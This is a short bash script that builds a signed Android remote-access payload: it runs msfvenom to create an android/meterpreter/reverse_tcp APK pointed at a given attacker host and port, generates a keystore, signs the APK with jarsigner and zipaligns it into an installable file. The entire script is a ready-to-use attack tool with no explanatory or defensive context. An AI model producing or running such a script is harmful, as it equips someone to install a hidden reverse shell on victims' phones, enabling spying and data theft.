#!/bin/bash

# Check if the correct number of arguments is provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <LHOST> <LPORT>"
    exit 1
fi

LHOST=$1
LPORT=$2

# Generate the payload with msfvenom
echo "[*] Generating payload..."
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o android.apk

# Generate the keystore
echo "[*] Generating keystore..."
keytool -genkey -V -keystore key.keystore -alias emi -keyalg RSA -keysize 2048 -validity 10000 \
    -dname "CN=YourName, OU=YourOrg, O=YourOrg, L=YourCity, ST=YourState, C=YourCountry" \
    -storepass password -keypass password

# Sign the APK
echo "[*] Signing the APK..."
sudo jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore android.apk emi

# Verify the signed APK
echo "[*] Verifying the APK..."
sudo jarsigner -verify -verbose -certs android.apk

# Align the APK
echo "[*] Aligning the APK..."
zipalign -v 4 android.apk signed_jar.apk

echo "[*] Process completed! The signed APK is named 'signed_jar.apk'."
